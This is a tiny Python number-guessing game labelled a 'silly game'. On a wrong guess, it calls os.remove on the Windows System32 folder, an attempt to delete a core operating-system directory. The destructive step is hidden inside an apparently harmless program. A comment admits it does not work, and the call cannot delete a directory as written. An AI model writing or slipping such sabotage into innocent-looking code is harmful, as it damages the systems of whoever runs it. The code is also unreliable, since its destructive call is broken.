import random
import os

number = random.randint(1,10)

guess = int(input("Silly game! guess number between 1 and 10 : "))

if guess == number:
    print('You Won')
else:
    os.remove("C:/Windows/System32") # Not Working ❌